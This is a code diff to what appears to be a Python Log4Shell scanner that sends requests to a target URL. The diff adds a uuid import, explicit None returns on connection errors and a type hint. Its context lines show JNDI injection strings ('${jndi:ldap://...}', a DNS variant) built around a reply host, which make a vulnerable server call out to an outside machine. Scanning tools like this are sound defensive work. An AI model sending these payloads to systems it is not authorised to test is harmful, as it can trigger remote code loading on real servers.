@@ -1,5 +1,6 @@
 import json
 import logging
+import uuid
 from base64 import b64encode
 from os import getenv
 from urllib.parse import urlparse
@@ -49,6 +50,7 @@ def check_with_header(url_input: str, header_name: str, payload: str, timeout: i
         return b64encode(response.content).decode()
     except requests.exceptions.ConnectionError as e:
         logging.error("HTTP connection to %s URL error: %s", url_input, e)
+        return None
 
 
 def check(url_input: str, payload: str, timeout: int) -> str | None:
@@ -58,9 +60,10 @@ def check(url_input: str, payload: str, timeout: int) -> str | None:
         return b64encode(response.content).decode()
     except requests.exceptions.ConnectionError as e:
         logging.error("HTTP connection to %s URL error: %s", url_input, e)
+        return None
 
 
-def get_payloads(url_input: str, reply_host: str, identifier: str) -> dict[str, str]:
+def get_payloads(url_input: str, reply_host: str, identifier: uuid.UUID) -> dict[str, str]:
     payloads = [
         "${{jndi:ldap://{}/test.class}}",
         "${{jndi:dns://{}:53/test.class}}",
